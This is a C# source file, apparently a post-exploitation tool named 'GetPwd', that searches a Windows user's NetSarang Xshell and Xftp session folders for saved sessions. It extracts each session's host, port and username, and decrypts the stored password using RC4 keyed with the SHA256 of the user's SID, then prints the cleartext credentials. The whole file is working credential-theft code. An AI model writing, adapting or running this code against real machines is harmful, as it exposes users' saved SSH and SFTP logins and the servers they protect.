using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace GetPwd
{
    class XmangagerCrypt
    {
        public void Xmangager(string path, string UserSid)
        {
            string sourse = File.ReadAllText(path);
            string arg = MidStrEx(sourse, "Host=", "\r\n");
            string arg2 = MidStrEx(sourse, "[CONNECTION]\r\nPort=", "\r\n");
            string arg3 = MidStrEx(sourse, "UserName=", "\r\n");
            string text = MidStrEx(sourse, "Password=", "\r\n");
            string arg4 = MidStrEx(sourse, "[SessionInfo]\r\nVersion=", "\r\n");
            if (text != null && text != "")
            {
                byte[] array = Convert.FromBase64String(text);
                byte[] pwd = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(UserSid));
                byte[] array2 = new byte[array.Length - 32];
                Array.Copy(array, 0, array2, 0, array.Length - 32);
                byte[] bytes = RC4.Decrypt(pwd, array2);
                Console.WriteLine("[+] Session File:" + path);
                Console.WriteLine("  Host: {0}", arg);
                Console.WriteLine("  Port: {0}", arg2);
                Console.WriteLine("  UserName: {0}", arg3);
                Console.WriteLine("  Version: {0}", arg4);
                Console.WriteLine("  Password: {0}", text);
                Console.WriteLine("  UserSid(Key): {0}", UserSid);
                Console.WriteLine("  Decrypt: {0}", Encoding.ASCII.GetString(bytes));
            }
        }

        public static string MidStrEx(string sourse, string startstr, string endstr)
        {
            string empty = string.Empty;
            int num = sourse.IndexOf(startstr);
            if (num == -1)
            {
                return empty;
            }
            string text = sourse.Substring(num + startstr.Length);
            int num2 = text.IndexOf(endstr);
            if (num2 == -1)
            {
                return empty;
            }
            return text.Remove(num2);
        }

        public static string getlnk()
        {
            IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Xshell 6\Xagent.lnk");
            return shortcut.TargetPath.Replace("Xagent.exe", "");
        }

        public static List<string> checkPath()
        {
            List<string> pathlist = new List<string>(){
                Environment.GetEnvironmentVariable("USERPROFILE")+@"\Documents\NetSarang\Xshell\Sessions",
                Environment.GetEnvironmentVariable("USERPROFILE")+@"\Documents\NetSarang\Xftp\Sessions",
                Environment.GetEnvironmentVariable("USERPROFILE")+@"\Documents\NetSarang Computer\6\Xshell\Sessions",
                Environment.GetEnvironmentVariable("USERPROFILE")+@"\Documents\NetSarang Computer\6\Xftp\Sessions",
                getlnk()+@"\log\Xshell\Sessions"
            };
            List<string> xshpathlist = new List<string>();
            foreach (string path in pathlist)
            {
                if (Directory.Exists(path))//判断是否存在
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(path);
                    FileInfo[] files = directoryInfo.GetFiles();
                    foreach (FileInfo fileInfo in files)
                    {
                        string name = fileInfo.Name;
                        if (fileInfo.Extension.Equals(".xsh"))
                        {
                            string path2 = path + "\\" + name;
                            xshpathlist.Add(path2);
                        }
                    }
                }
            }
            return xshpathlist;
        }

        public static string ConvertByteToStringSid(Byte[] sidBytes)
        {
            StringBuilder strSid = new StringBuilder();
            strSid.Append("S-");
            try
            {
                // Add SID revision.
                strSid.Append(sidBytes[0].ToString());
                // Next six bytes are SID authority value.
                if (sidBytes[6] != 0 || sidBytes[5] != 0)
                {
                    string strAuth = String.Format
                        ("0x{0:2x}{1:2x}{2:2x}{3:2x}{4:2x}{5:2x}",
                        (Int16)sidBytes[1],
                        (Int16)sidBytes[2],
                        (Int16)sidBytes[3],
                        (Int16)sidBytes[4],
                        (Int16)sidBytes[5],
                        (Int16)sidBytes[6]);
                    strSid.Append("-");
                    strSid.Append(strAuth);
                }
                else
                {
                    Int64 iVal = (Int32)(sidBytes[1]) +
                        (Int32)(sidBytes[2] << 8) +
                        (Int32)(sidBytes[3] << 16) +
                        (Int32)(sidBytes[4] << 24);
                    strSid.Append("-");
                    strSid.Append(iVal.ToString());
                }

                // Get sub authority count...
                int iSubCount = Convert.ToInt32(sidBytes[7]);
                int idxAuth = 0;
                for (int i = 0; i < iSubCount; i++)
                {
                    idxAuth = 8 + i * 4;
                    UInt32 iSubAuth = BitConverter.ToUInt32(sidBytes, idxAuth);
                    strSid.Append("-");
                    strSid.Append(iSubAuth.ToString());
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Trace.Write(ex.Message);
                return "";
            }
            return strSid.ToString();
        }
    }


    public class RC4
    {
        public static byte[] Encrypt(byte[] pwd, byte[] data)
        {
            int[] array = new int[256];
            int[] array2 = new int[256];
            byte[] array3 = new byte[data.Length];
            int i;
            for (i = 0; i < 256; i++)
            {
                array[i] = pwd[i % pwd.Length];
                array2[i] = i;
            }
            int num = i = 0;
            for (; i < 256; i++)
            {
                num = (num + array2[i] + array[i]) % 256;
                int num2 = array2[i];
                array2[i] = array2[num];
                array2[num] = num2;
            }
            int num3 = num = (i = 0);
            for (; i < data.Length; i++)
            {
                num3++;
                num3 %= 256;
                num += array2[num3];
                num %= 256;
                int num2 = array2[num3];
                array2[num3] = array2[num];
                array2[num] = num2;
                int num4 = array2[(array2[num3] + array2[num]) % 256];
                array3[i] = (byte)(data[i] ^ num4);
            }
            return array3;
        }

        public static byte[] Decrypt(byte[] pwd, byte[] data)
        {
            return Encrypt(pwd, data);
        }
    }
}
